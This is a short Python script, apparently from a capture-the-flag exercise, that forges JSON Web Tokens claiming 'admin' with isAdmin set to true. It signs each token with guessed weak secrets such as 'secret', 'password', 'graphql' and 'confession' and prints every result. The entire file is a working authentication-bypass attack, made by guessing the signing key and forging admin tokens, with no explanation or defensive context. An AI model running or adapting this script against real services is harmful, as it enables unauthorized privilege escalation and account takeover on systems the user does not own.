#!/usr/bin/env python3
import base64
import hmac
import hashlib
import json

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

# Header
header = {
    "alg": "HS256",
    "typ": "JWT"
}

# Payload
payload = {
    "username": "admin",
    "isAdmin": True,
    "iat": 1754643801
}

# Encode header and payload
header_encoded = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
payload_encoded = base64url_encode(json.dumps(payload, separators=(',', ':')).encode())

# Message to sign
message = f"{header_encoded}.{payload_encoded}"

# Try different secrets
secrets = ["secret", "Secret", "SECRET", "password", "123456", "admin", "key", "graphql", "confession"]

for secret in secrets:
    # Create signature
    signature = hmac.new(
        secret.encode(),
        message.encode(),
        hashlib.sha256
    ).digest()
    
    signature_encoded = base64url_encode(signature)
    
    # Complete JWT
    jwt_token = f"{message}.{signature_encoded}"
    
    print(f"Secret: {secret}")
    print(f"Token: {jwt_token}")
    print("-" * 50)